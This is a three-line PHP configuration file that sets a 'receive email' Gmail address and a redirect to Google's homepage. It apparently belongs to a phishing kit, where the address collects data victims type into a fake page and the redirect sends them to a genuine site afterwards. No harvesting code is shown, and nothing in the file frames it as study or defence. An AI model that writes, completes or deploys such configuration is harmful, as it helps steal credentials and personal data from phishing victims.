<?php 
$Receive_email="todayxx911@gmail.com";
$redirect="https://www.google.com/";
?>